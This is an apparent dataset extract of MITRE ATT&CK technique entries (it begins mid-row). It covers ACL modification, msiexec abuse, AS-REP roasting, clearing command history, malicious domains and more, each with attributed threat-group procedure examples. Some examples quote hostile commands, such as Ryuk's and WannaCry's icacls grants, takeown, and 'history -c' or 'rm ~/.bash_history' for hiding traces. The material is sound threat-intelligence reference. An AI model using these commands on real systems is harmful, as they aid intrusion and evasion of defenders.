to reset a targeted executable's permissions and then take ownership."", '[Grandoreiro] can modify the binary ACL to prevent security tools from running.', '[Wizard Spider] has used the icacls command to modify access control to backup servers, providing them with full control of all the system folders.', '[CaddyWiper] can modify ACL entries to take ownership of files.', '[Ryuk] can launch <code>icacls <path> /grant Everyone:F /T /C /Q</code> to delete every access-based restrictions on files and directories.', '[BlackCat] can use Windows commands such as `fsutil behavior set SymLinkEvaluation R2L:1` to redirect file system access to a different location after gaining access into compromised networks.', '[WannaCry] uses <code>attrib +h</code> and <code>icacls . /grant Everyone:F /T /C /Q</code> to make some of its files hidden and grant all users full access controls.', '[WastedLocker] has a command to take ownership of a file and reset the ACL permissions using the <code>takeown.exe /F filepath</code> command. ']",False
T1137.006,Add-ins,"Adversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.  There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins.   Add-ins can be used to obtain persistence because they can be set to execute code when an Office application starts. ","['[Bisonal] has been loaded through a `.wll` extension added to the ` %APPDATA%\\microsoft\\word\\startup\\` repository. ', '[Naikon] has used the RoyalRoad exploit builder to drop a second stage loader, intel.wll, into the Word Startup folder on the compromised host.']",
T1505.002,Transport Agent,"Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails. Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks.   Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events. Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. ",['[LightNeuron] has used a malicious Microsoft Exchange transport agent for persistence.'],
T1574.014,AppDomainManager,"Adversaries may execute their own malicious payloads by hijacking how the .NET `AppDomainManager` loads assemblies. The .NET framework uses the `AppDomainManager` class to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (`.exe` or `.dll` binaries compiled to run as .NET code) may be loaded into an application domain as executable code.   Known as ""AppDomainManager injection,"" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (`.config`) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.",[],False
T1074.002,Remote Data Staging,"Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data] Interactive command shells may be used, and common functionality within [cmd] and bash may be used to copy data into a staging location.  In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance] and stage data in that instance.  By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.","['[Chimera] has staged stolen data on designated servers in the target environment.', '[ccf32] has copied files to a remote machine infected with [Chinoxy] or another backdoor.', ""During the [SolarWinds Compromise] [APT29] staged data and files in password-protected archives on a victim's OWA server."", '[menuPass] has staged data on remote MSP systems or other victim networks prior to exfiltration.', '[FIN8] aggregates staged data from a network into a single location.', '[Leviathan] has staged data remotely prior to exfiltration.', ""[APT28] has staged archives of collected data on a target's Outlook Web Access (OWA) server."", '[MoustachedBouncer] has used plugins to save captured screenshots to `.\\AActdata\\` on an SMB share.', '[ToddyCat] manually transferred collected files to an exfiltration host using xcopy.', '[FIN6] actors have compressed data from remote systems and moved it to another staging system before exfiltration.', 'During [Night Dragon] threat actors copied files to company web servers and subsequently downloaded them.', '[Threat Group-3390] has moved staged encrypted archives to Internet-facing servers that had previously been compromised with [China Chopper] prior to exfiltration.', ""[UNC2452] staged data and files in password-protected archives on a victim's OWA server."", ""[APT29] staged data and files in password-protected archives on a victim's OWA server."", '[Night Dragon] has copied files to company web servers and subsequently downloaded them.']",
T1098.006,Additional Container Cluster Roles,"An adversary may add additional roles or permissions to an adversary-controlled user or service account to maintain persistent access to a container orchestration system. For example, an adversary with sufficient permissions may create a RoleBinding or a ClusterRoleBinding to bind a Role or ClusterRole to a Kubernetes account. Where attribute-based access control (ABAC) is in use, an adversary with sufficient permissions may modify a Kubernetes ABAC policy to give the target account additional permissions.   This account modification may immediately follow [Create Account] or other malicious account activity. Adversaries may also modify existing [Valid Accounts] that they have compromised.    Note that where container orchestration systems are deployed in cloud environments, as with Google Kubernetes Engine, Amazon Elastic Kubernetes Service, and Azure Kubernetes Service, cloud-based  role-based access control (RBAC) assignments or ABAC policies can often be used in place of or in addition to local permission assignments. In these cases, this technique may be used in conjunction with [Additional Cloud Roles]",[],False
T1218.007,Msiexec,"Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). The Msiexec.exe binary may also be digitally signed by Microsoft.  Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it may be signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse. Msiexec.exe execution may also be elevated to SYSTEM privileges if the <code>AlwaysInstallElevated</code> policy is enabled.","['[Chaes] has used .MSI files as an initial way to start the infection chain.', '[Molerats] has used msiexec.exe to execute an MSI payload. ', '[Duqu] has used <code>msiexec</code> to execute malicious Windows Installer packages. Additionally, a PROPERTY=VALUE pair containing a 56-bit encryption key has been used to decrypt the main payload from the installer packages.', '[Metamorfo] has used MsiExec.exe to automatically execute files. ', '[DEADEYE] can use `msiexec.exe` for execution of malicious DLL.', '[IcedID] can inject itself into a suspended msiexec.exe process to send beacons to C2 while appearing as a normal msi application. ', '[Mispadu] has been installed via MSI installer.', '[RCSession] has the ability to execute inside the msiexec.exe process.', '[TA505] has used <code>msiexec</code> to download and execute malicious Windows Installer files.', '[Melcoz] can use MSI files with embedded VBScript for execution.', '[QakBot] can use MSIExec to spawn multiple cmd.exe processes.', '[Grandoreiro] can use MSI files to execute DLLs.', '[AppleJeus] has been installed via MSI installer.', '[Javali] has used the MSI installer to download and execute malicious payloads.', '[Ragnar Locker] has been delivered as an unsigned MSI package that was executed with <code>msiexec.exe</code>.', '[Rancor] has used <code>msiexec</code> to download and execute malicious installer files over HTTP.', '[ZIRCONIUM] has used the msiexec.exe command-line utility to download and execute malicious MSI files.', '[Machete] has used msiexec to install the [Machete] malware.', '[LoudMiner] used an MSI installer to install the virtualization software.\t', '[Maze] has delivered components for its ransomware attacks using MSI files, some of which have been executed from the command-line using <code>msiexec</code>.', '[RemoteUtilities] can use Msiexec to install a service.', '[FlawedAmmyy] has been installed via `msiexec.exe`. ', '[Clop] can use msiexec.exe to disable security tools on the system. ']",False
T1590.003,Network Trust Dependencies,"Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.  Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information] Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases] Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning] or [Search Open Websites/Domains] establishing operational resources (ex: [Acquire Infrastructure] or [Compromise Infrastructure] and/or initial access (ex: [Trusted Relationship]",[],
T1498.002,Reflection Amplification,"Adversaries may attempt to cause a denial of service (DoS) by reflecting a high-volume of network traffic to a target. This type of Network DoS takes advantage of a third-party server intermediary that hosts and will respond to a given spoofed source IP address. This third-party server is commonly termed a reflector. An adversary accomplishes a reflection attack by sending packets to reflectors with the spoofed address of the victim. Similar to Direct Network Floods, more than one system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target. This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.  Reflection attacks often take advantage of protocols with larger responses than requests in order to amplify their traffic, commonly known as a Reflection Amplification attack. Adversaries may be able to generate an increase in volume of attack traffic that is several orders of magnitude greater than the requests sent to the amplifiers. The extent of this increase will depending upon many variables, such as the protocol in question, the technique used, and the amplifying servers that actually produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS and NTP, though the use of several others in the wild have been documented.  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.",[],
T1556.002,Password Filter DLL,"Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.   Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.   Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.","['[Remsec] harvests plain-text credentials as a password filter registered on domain controllers.', '[Strider] has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password.']",
T1505.005,Terminal Services DLL,"Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.  [Windows Service] that are run as a ""generic"" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>. The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\System32\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.  Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts. Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol] sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality. On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.",[],False
T1059.002,AppleScript,"Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.  Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e ""script here""</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.  AppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API] <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.  Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API] which otherwise would require compilation and execution in a mach-O binary file format. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python]","['[Dok] uses AppleScript to create a login item for persistence.', '[ThiefQuest] uses [AppleScript] <code>osascript -e</code> command to launch [ThiefQuest] persistence via [Launch Agent] and [Launch Daemon] ', '[Bundlore] can use AppleScript to inject malicious JavaScript into a browser.', '[macOS.OSAMiner] has used `osascript` to call itself via the `do shell script` command in the [Launch Agent] `.plist` file.']",False
T1499.002,Service Exhaustion Flood,"Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well. Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.  One example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.  Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.",[],False
T1195.003,Compromise Hardware Supply Chain,"Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",[],False
T1070.007,Clear Network Connection History and Configurations,"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as [Remote Services] or [External Remote Services] Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.  Network connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under :  * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default</code> * <code>HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers</code>  Windows may also store information about recent RDP connections in files such as <code>C:\Users\\%username%\Documents\Default.rdp</code> and `C:\Users\%username%\AppData\Local\Microsoft\Terminal Server Client\Cache\`. Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in `/Library/Logs` and/or `/var/log/`).  Malicious network connections may also require changes to third-party applications or network configuration settings, such as [Disable or Modify System Firewall] or tampering to enable [Proxy] Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.","['[SUNBURST] also removed the firewall rules it created during execution.', '[Volt Typhoon] have inspected server logs to remove their IPs.']",False
T1558.004,AS-REP Roasting,"Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by [Password Cracking] Kerberos messages.   Preauthentication offers protection against offline [Password Cracking] When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.  For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline [Password Cracking] attacks similarly to [Kerberoasting] and expose plaintext credentials.    An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like [PowerShell] with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data.   Cracked hashes may enable [Persistence] [Privilege Escalation] and [Lateral Movement] via access to [Valid Accounts]",['[Rubeus] can reveal the credentials of accounts that have Kerberos pre-authentication disabled through AS-REP roasting. '],
T1584.003,Virtual Private Server,"Adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.  Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",['[Turla] has used the VPS infrastructure of compromised Iranian threat actors.'],
T1059.010,AutoHotKey & AutoIT,"Adversaries may execute commands and perform malicious tasks using AutoIT and AutoHotKey automation scripts. AutoIT and AutoHotkey (AHK) are scripting languages that enable users to automate Windows tasks. These automation scripts can be used to perform a wide variety of actions, such as clicking on buttons, entering text, and opening and closing programs.  Adversaries may use AHK (`.ahk`) and AutoIT (`.au3`) scripts to execute malicious code on a victim's system. For example, adversaries have used for AHK to execute payloads and other modular malware such as keyloggers. Adversaries have also used custom AHK files containing embedded malware as [Phishing] payloads.  These scripts may also be compiled into self-contained executable payloads (`.exe`).","['[Melcoz] has been distributed through an AutoIt loader script.', '[APT39] has utilized AutoIt malware scripts embedded in Microsoft Office documents or malicious links.', '[DarkGate] uses AutoIt scripts dropped to a hidden directory during initial installation phases, such as `test.au3`.']",False
T1600.001,Reduce Key Space,"Adversaries may reduce the level of effort required to decrypt data transmitted over the network by reducing the cipher strength of encrypted communications.  Adversaries can weaken the encryption software on a compromised network device by reducing the key size used by the software to convert plaintext to ciphertext (e.g., from hundreds or thousands of bytes to just a couple of bytes). As a result, adversaries dramatically reduce the amount of effort needed to decrypt the protected information without the key.  Adversaries may modify the key size used and other encryption parameters using specialized commands in a [Network Device CLI] introduced to the system through [Modify System Image] to change the configuration of the device. ",[],
T1070.003,Clear Command History,"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.  On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions.  Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.    Adversaries may also leverage a [Network Device CLI] on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>).  On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.  The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.  Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run.","['[TeamTNT] has cleared command history with <code>history -c</code>.', '[Kobalos] can remove all command history on compromised hosts.\t', '[Hildegard] has used history -c to clear script shell logs.', '[menuPass] has used [Wevtutil] to remove PowerShell execution logs.', '[Magic Hound] has removed mailbox export requests from compromised Exchange servers.', '[Lazarus Group] has routinely deleted log files on a compromised router, including automatic log deletion through the use of the logrotate utility. ', '[APT5] has cleared the command history on targeted ESXi servers.', '[APT41] attempted to remove evidence of some of its activity by deleting Bash histories.']",False
T1137.005,Outlook Rules,"Adversaries may abuse Microsoft Outlook rules to obtain persistence on a compromised system. Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.  Once malicious rules have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious rules will execute when an adversary sends a specifically crafted email to the user.",['[Ruler] can be used to automate the abuse of Outlook Rules to establish persistence. '],
T1586.003,Cloud Accounts,"Adversaries may compromise cloud accounts that can be used during targeting. Adversaries can use compromised cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage] or to [Upload Tool] Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server] or [Serverless] infrastructure. Compromising cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.  A variety of methods exist for compromising cloud accounts, such as gathering credentials via [Phishing for Information] purchasing credentials from third-party sites, conducting [Password Spraying] attacks, or attempting to [Steal Application Access Token] Prior to compromising cloud accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. In some cases, adversaries may target privileged service provider accounts with the intent of leveraging a [Trusted Relationship] between service providers and their customers.","['[APT29] has used residential proxies, including Azure Virtual Machines, to obfuscate their access to victim environments.']",False
T1586.002,Email Accounts,"Adversaries may compromise email accounts that can be used during targeting. Adversaries can use compromised email accounts to further their operations, such as leveraging them to conduct [Phishing for Information] [Phishing] or large-scale spam email campaigns. Utilizing an existing persona with a compromised email account may engender a level of trust in a potential victim if they have a relationship with, or knowledge of, the compromised persona. Compromised email accounts can also be used in the acquisition of infrastructure (ex: [Domains]  A variety of methods exist for compromising email accounts, such as gathering credentials via [Phishing for Information] purchasing credentials from third-party sites, brute forcing credentials (ex: password reuse from breach credential dumps), or paying employees, suppliers or business partners for access to credentials. Prior to compromising email accounts, adversaries may conduct Reconnaissance to inform decisions about which accounts to compromise to further their operation. Adversaries may target compromising well-known email accounts or domains from which malicious spam or [Phishing] emails may evade reputation-based email filtering rules.  Adversaries can use a compromised email account to hijack existing email threads with targets of interest.","['[APT28] has used compromised email accounts to send credential phishing emails.', '[Magic Hound] has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information.', '[HEXANE] has used compromised accounts to send spearphishing emails.', '[Kimsuky] has compromised email accounts to send spearphishing e-mails.', '[LAPSUS$] has payed employees, suppliers, and business partners of target organizations for credentials.', '[IndigoZebra] has compromised legitimate email accounts to use in their spearphishing operations.', '[APT29] has compromised email accounts to further enable phishing campaigns and taken control of dormant accounts.', '[Leviathan] has compromised email accounts to conduct social engineering attacks.']",False
T1608.001,Upload Malware,"Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer] by placing it on an Internet accessible web server.  Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure] or was otherwise compromised by them ([Compromise Infrastructure] Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.  Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution] [Masquerading] may increase the chance of users mistakenly executing these files.","['[TA2541] has uploaded malware to various platforms including Google Drive, Pastetext, Sharetext, and GitHub.', 'For [Operation Dream Job] [Lazarus Group] used compromised servers to host malware.', 'During [Night Dragon] threat actors uploaded commonly available hacker tools to compromised web servers.', '[Earth Lusca] has staged malware and malicious files on compromised web servers, GitHub, and Google Drive.', '[Mustang Panda] has hosted malicious payloads on DropBox including [PlugX]', '[LuminousMoth] has hosted malicious payloads on Dropbox.', 'For [C0011] [Transparent Tribe] hosted malicious documents on domains registered by the group. ', '[Kimsuky] has used Blogspot to host malicious content such as beacons, file exfiltrators, and implants.', '[Mustard Tempest] has hosted payloads on acquired second-stage servers for periods of either days, weeks, or months.', '[TeamTNT] has uploaded backdoored Docker images to Docker Hub.', 'For [Operation Spalax] the threat actors staged malware and malicious files in legitimate hosting services such as OneDrive or MediaFire.', '[LazyScripter] has hosted open-source remote access Trojans used in its operations in GitHub.', '[Gamaredon Group] has registered domains to stage payloads.', '[Threat Group-3390] has hosted malicious payloads on Dropbox.', '[SideCopy] has used compromised domains to host its malicious payloads.', 'For [C0010] UNC3890 actors staged malware on their infrastructure for direct download onto a compromised system. ', 'For [Operation Sharpshooter] the threat actors staged malicious files on Dropbox and other websites.', '[TA505] has staged malware on actor-controlled domains.', '[BITTER] has registered domains to stage payloads.', 'For [C0021] the threat actors uploaded malware to websites under their control.', '[APT32] has hosted malicious payloads in Dropbox, Amazon S3, and Google Drive for use during targeting.', '[HEXANE] has staged malware on fraudulent websites set up to impersonate targeted organizations.', '[FIN7] has staged legitimate software, that was trojanized to contain an Atera agent installer, on Amazon S3.', '[EXOTIC LILY]  has uploaded malicious payloads to file-sharing services including TransferNow, TransferXL, WeTransfer, and OneDrive.', '[Lazarus Group] has hosted malicious files on compromised as well as [Lazarus Group] servers.']",False
T1583.001,Domains,"Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.  Adversaries may use acquired domains for a variety of purposes, including for [Phishing] [Drive-by Compromise] and Command and Control. Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD). Typosquatting may be used to aid in delivery of payloads via [Drive-by Compromise] Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute ""IDN homograph attacks,"" creating visually similar lookalike domains used to deliver malware to victim machines.  Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).  Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.  Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.","['For [C0021] the threat actors registered domains for use in C2.', '[APT28] registered domains imitating NATO, OSCE security websites, Caucasus information resources, and other organizations.', '[TA505] has registered domains to impersonate services such as Dropbox to distribute malware.', 'For [Operation Spalax] the threat actors registered hundreds of domains using Duck DNS and DNS Exit.', '[HEXANE] has registered and operated domains for campaigns, often using a security or web technology theme or impersonating the targeted organization.', '[APT1] has registered hundreds of domains for use in operations.', 'During [Operation Honeybee] threat actors registered domains for C2.', '[APT32] has set up and operated websites to gather information and deliver malware.', '[IndigoZebra] has established domains, some of which were designed to look like official government domains, for their operations.', 'For [Operation Dust Storm] the threat actors established domains as part of their operational infrastructure.', '[Leviathan] has established domains that impersonate legitimate entities to use for targeting efforts. ', 'During [Operation Dream Job] [Lazarus Group] registered a domain name identical to that of a compromised company as part of their BEC effort.', '[Earth Lusca] has registered domains, intended to look like legitimate target domains, that have been used in watering hole attacks. ', '[Kimsuky] has registered domains to spoof targeted organizations and trusted third parties.', '[Dragonfly] has registered domains for targeting intended victims.', '[TA2541] has registered domains often containing the keywords “kimjoy,” “h0pe,” and “grace,” using domain registrars including Netdorm and No-IP DDNS, and hosting providers including xTom GmbH and Danilenko, Artyom.', '[LazyScripter] has used dynamic DNS providers to create legitimate-looking subdomains for C2.', '[Transparent Tribe] has registered domains to mimic file sharing, government, defense, and research websites for use in targeted campaigns.', '[ZIRCONIUM] has purchased domains for use in targeted campaigns.', 'For [Operation Ghost] [APT29] registered domains for use in C2 including some crafted to appear as existing legitimate domains.', '[Threat Group-3390] has registered domains for C2.', '[DarkGate] command and control includes hard-coded domains in the malware chosen to masquerade as legitimate services such as Akamai CDN or Amazon Web Services.', 'For [C0026] the threat actors re-registered expired C2 domains previously used for [ANDROMEDA] malware.', 'For [CostaRicto] the threat actors established domains, some of which appeared to spoof legitimate domains.', '[Mustang Panda] have acquired C2 domains prior to operations.', 'For [C0010] UNC3890 actors established domains that appeared to be legitimate services and entities, such as LinkedIn, Facebook, Office 365, and Pfizer.', '[Lazarus Group] has acquired domains related to their campaigns to act as distribution points and C2 channels.', '[EXOTIC LILY] has registered domains to spoof targeted organizations by changing the top-level domain (TLD) to “.us”, “.co” or “.biz”.', '[Silent Librarian] has acquired domains to establish credential harvesting pages, often spoofing the target organization and using free top level domains .TK, .ML, .GA, .CF, and .GQ.', '[FIN7] has registered look-alike domains for use in phishing campaigns.', 'For [C0011] [Transparent Tribe] registered domains likely designed to appear relevant to student targets in India.', 'For [FunnyDream] the threat actors registered a variety of domains.', '[Magic Hound] has registered fraudulent domains such as ""mail-newyorker.com"" and ""news12.com.recover-session-service.site"" to target specific victims with phishing attacks.', '[Gamaredon Group] has registered multiple domains to facilitate payload staging and C2.', '[BITTER] has registered a variety of domains to host malicious payloads and for C2.', '[TeamTNT] has obtained domains to host their payloads.', '[Sandworm Team] has registered domain names and created URLs that are often designed to mimic or spoof legitimate websites, such as email login pages, online file sharing and storage websites, and password reset pages, while also hosting these items on legitimate, compromised network infrastructure.', '[Winnti Group] has registered domains for C2 that mimicked sites of their intended targets.', '[Ferocious Kitten] has acquired domains imitating legitimate sites.', 'For the [SolarWinds Compromise] [APT29] acquired C2 domains, sometimes through resellers.', '[menuPass] has registered malicious domains for use in intrusion campaigns.', '[APT29] has acquired C2 domains, sometimes through resellers.', '[UNC2452] has acquired C2 domains through resellers.']",False
